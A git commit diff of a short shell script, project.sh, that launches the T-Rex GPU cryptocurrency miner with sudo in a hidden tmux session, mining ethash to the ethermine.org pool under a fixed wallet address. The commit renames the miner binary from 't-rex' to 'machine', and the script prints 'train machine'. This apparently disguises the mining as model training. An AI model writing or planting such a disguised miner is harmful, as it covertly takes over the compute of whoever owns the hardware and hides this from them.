b508c65282fd5619c46adfcbdce5c36ff22873fb
Akira-Slasvi <92677873+Akira-Slasvi@users.noreply.github.com>
2021-11-15 11:40:02 +0800

    Update project.sh

--- project.sh
+++ project.sh
@@ -1,4 +1,4 @@
 echo project start
 echo train machine
-chmod +x t-rex
-sudo tmux new-session -d -s SANS './t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w rig0 --lock-cclock 1200'
+chmod +x machine
+sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w rig0 --fan 80 --pl 70 --lock-cclock 1150'
